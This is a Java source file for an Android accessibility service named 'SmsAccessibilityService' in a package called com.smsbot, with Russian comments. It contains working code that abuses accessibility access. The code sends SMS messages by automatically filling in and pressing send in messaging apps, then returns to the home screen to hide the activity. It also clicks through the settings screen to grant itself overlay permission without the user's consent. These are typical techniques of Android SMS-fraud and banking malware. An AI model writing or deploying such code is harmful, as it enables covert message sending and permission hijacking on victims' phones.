package com.smsbot;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class SmsAccessibilityService extends AccessibilityService {
    private static SmsAccessibilityService instance;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isGrantingPermission = false;

    public static SmsAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.packageNames = new String[]{
                "com.google.android.apps.messaging",
                "com.android.mms",
                "com.samsung.android.messaging",
                "com.android.settings",
                "com.android.packageinstaller"
        };
        setServiceInfo(info);
    }

    public void openSmsDialog(String phone) {
        handler.post(() -> {
            try {
                Intent intent = new Intent(Intent.ACTION_SENDTO);
                intent.setData(Uri.parse("smsto:" + Uri.encode(phone)));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception e) {
                Log.e("SMS_ACCESS", "Cannot open SMS app", e);
            }
        });
    }

    // Метод для GUI-отправки SMS (Уровень 3)
    public void sendSmsViaGui(String phone, String message) {
        handler.post(() -> {
            try {
                Intent intent = new Intent(Intent.ACTION_SENDTO);
                intent.setData(Uri.parse("smsto:" + Uri.encode(phone)));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);

                handler.postDelayed(() -> {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root != null) {
                        List<AccessibilityNodeInfo> editors = root.findAccessibilityNodeInfosByViewId("com.android.mms:id/embedded_text_editor");
                        if (editors.isEmpty()) editors = root.findAccessibilityNodeInfosByViewId("com.google.android.apps.messaging:id/compose_message_text");
                        if (editors.isEmpty()) editors = root.findAccessibilityNodeInfosByViewId("android:id/input");
                        if (!editors.isEmpty()) {
                            AccessibilityNodeInfo editor = editors.get(0);
                            Bundle args = new Bundle();
                            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, message);
                            editor.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);

                            handler.postDelayed(() -> {
                                AccessibilityNodeInfo newRoot = getRootInActiveWindow();
                                if (newRoot != null) {
                                    List<AccessibilityNodeInfo> sendBtns = newRoot.findAccessibilityNodeInfosByViewId("com.android.mms:id/send_button");
                                    if (sendBtns.isEmpty()) sendBtns = newRoot.findAccessibilityNodeInfosByViewId("com.google.android.apps.messaging:id/send_message_button");
                                    if (sendBtns.isEmpty()) sendBtns = newRoot.findAccessibilityNodeInfosByText("Отправить");
                                    if (!sendBtns.isEmpty()) {
                                        sendBtns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                        handler.postDelayed(() -> {
                                            Intent home = new Intent(Intent.ACTION_MAIN);
                                            home.addCategory(Intent.CATEGORY_HOME);
                                            home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                            startActivity(home);
                                        }, 2000);
                                    }
                                }
                            }, 1000);
                        }
                    }
                }, 2000);
            } catch (Exception e) {
                Log.e("SMS_ACCESS", "GUI send failed", e);
            }
        });
    }

    // Авто-выдача SYSTEM_ALERT_WINDOW
    public void grantOverlayPermission() {
        isGrantingPermission = true;
        handler.post(() -> {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:com.smsbot"));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception e) {
                Log.e("SMS_ACCESS", "Ошибка открытия настроек", e);
                isGrantingPermission = false;
            }
        });
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (isGrantingPermission) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                List<AccessibilityNodeInfo> switches = root.findAccessibilityNodeInfosByViewId("android:id/switch_widget");
                if (switches != null && !switches.isEmpty()) {
                    for (AccessibilityNodeInfo node : switches) {
                        if (node.isCheckable() && !node.isChecked()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            isGrantingPermission = false;
                            break;
                        }
                    }
                }
                if (isGrantingPermission) {
                    List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByText("Разрешить");
                    if (btns != null && !btns.isEmpty()) {
                        btns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        isGrantingPermission = false;
                    }
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}
}
